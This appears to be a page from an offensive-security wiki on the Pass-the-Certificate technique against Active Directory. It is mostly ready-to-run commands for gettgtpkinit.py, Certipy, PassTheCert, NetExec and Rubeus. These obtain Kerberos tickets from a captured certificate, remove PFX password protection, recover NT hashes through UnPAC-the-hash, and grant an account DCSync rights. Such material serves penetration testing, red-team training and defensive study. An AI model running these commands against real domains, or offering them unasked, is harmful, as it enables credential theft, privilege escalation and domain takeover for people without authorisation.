## Theory
!!! note
    Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key. A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for authentication.

    The "certificate + private key" pair is usually used in the following manner

    - PEM certificate + PEM private key
    - PFX certificate export (which contains the private key) + PFX password (which protects the PFX certificate export)
## Exploit
=== "UNIX-like"
    From UNIX-like systems, Dirk-jan's gettgtpkinit.py from [PKINITtools](https://github.com/dirkjanm/PKINITtools) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.
    ```bash
    # PFX certificate (file) + password (string, optionnal)
    gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

    # Base64-encoded PFX certificate (string) (password can be set)
    gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

    # PEM certificate (file) + PEM private key (file)
    gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
    ```
    Alternatively, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used for the same purpose.
    ```bash
    certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
    ```
    Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.
    ```bash
    certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
    ```

    The ticket obtained can then be used to

    - authenticate with pass-the-cache
    - conduct an [UnPAC-the-hash](./UNPAC%20the%20hash.md) attack. This can be done with getnthash.py from PKINITtools.
    - obtain access to the account's SPN with an S4U2Self. This can be done with gets4uticket.py from [PKINITtools](https://github.com/dirkjanm/PKINITtools).
    !!! note
        When using Certipy for Pass-the-Certificate, it automatically does UnPAC-the-hash to recover the account's NT hash, in addition to saving the TGT obtained.
    
    Another alternative is with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py) (Python) which can be used to conduct multiple techniques like elevate a user for dcsync.md or change password for a specific user.
    ```bash
    # extract key and cert from the pfx
    certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
    certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"

    # elevate a user for DCSYNC with passthecert.py
    passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
    ```
    Netexec can be also used to perform Pass-the-Certificate authentication
    ```bash
    netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" -u user 
    netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
    netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
    netexec <proto> <ip> --cert-pem "PATH_TO_CRT" --key-pem "PATH_TO_KEY" -u user
    ```
=== "Windows"
    From Windows systems, Rubeus (C#) can be used to request a TGT (Ticket Granting Ticket) for the target object from a base64-encoded PFX certificate export (with an optional password).
    ```bash
    Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
    ```
    !!! note
        PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.
        ```bash
        openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
        ```
        Certipy uses DER encryption. To generate a PFX for Rubeus, openssl can be used.
        ```bash
        openssl rsa -inform DER -in key.key -out key-pem.key
        openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
        openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
        ```
        To generate a b64 for Rubeus:
        ```bash
        $pfx_cert = get-content 'c:\cert.pfx' -Encoding Byte
        $base64 = [System.Convert]::ToBase64String($pfx_cert)
        $base64
        ```
    The ticket obtained can then be used to

    - authenticate with pass-the-ticket
    - conduct an UnPAC-the-hash attack (add the /getcredentials flag to Rubeus's asktgt command)
    - obtain access to the account's SPN with an S4U2Self.